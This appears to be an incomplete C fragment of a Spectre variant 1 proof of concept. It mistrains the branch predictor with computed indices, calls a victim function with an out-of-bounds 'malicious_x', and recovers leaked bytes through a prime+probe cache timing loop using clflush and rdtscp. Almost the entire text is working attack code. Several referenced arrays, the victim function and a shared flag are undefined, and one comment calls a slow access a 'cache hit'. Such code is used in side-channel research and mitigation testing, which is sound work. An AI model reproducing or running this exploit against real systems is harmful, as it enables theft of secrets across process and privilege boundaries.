#define CACHE_MISS_THRESHOLD (60) /* assume cache miss if time >= threshold */
uint8_t array2[256 * 512];

typedef unsigned int size_t;
int prime()
{
    int i, junk = 0;
    for (i = 0; i < 256; i++)
        junk += array2[i * 512];
    return junk;
}
void test(size_t malicious_x, int tries)
{
    int j;
    size_t training_x, x;
    training_x = tries % array1_size;
    for (j = 29; j >= 0; j--)
    {
        _mm_clflush(&array1_size);
        volatile int z = 0;
        for (z = 0; z < 100; z++)
        {
        } /* Delay (can also mfence) */
        /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
        /* Avoid jumps in case those tip off the branch predictor */
        x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
        x = (x | (x >> 16));         /* Set x=-1 if j&6=0, else x=0 */
        x = training_x ^ (x & (malicious_x ^ training_x));
        /* Call the victim! */
        victim_function(x);
    }
}
void probe(int junk, int tries, int results[256])
{
    int i, mix_i;
    volatile uint8_t *addr;
    register uint64_t time1, time2;
    for (i = 0; i < 256; i++)
    {
        mix_i = ((i * 167) + 13) & 255;
        addr = &array2[mix_i * 512];
        time1 = __rdtscp(&junk);         /* READ TIMER */
        junk = *addr;                    /* MEMORY ACCESS TO TIME */
        time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
        if (time2 >= CACHE_MISS_THRESHOLD && mix_i != array1[tries % array1_size])
            results[mix_i]++; /* cache hit - add +1 to score for this value */
    }
}
void *primeProbe(void *arguments)
{ // int junk, int tries, int results[256]) {
    struct pp_arg_struct *args = arguments;
    int junk = args->junk;
    int tries = args->tries;
    int *results = args->results;
    prime();
    while (flag != 1)
    {
    }
    flag = 0;
    probe(junk, tries, results);
}
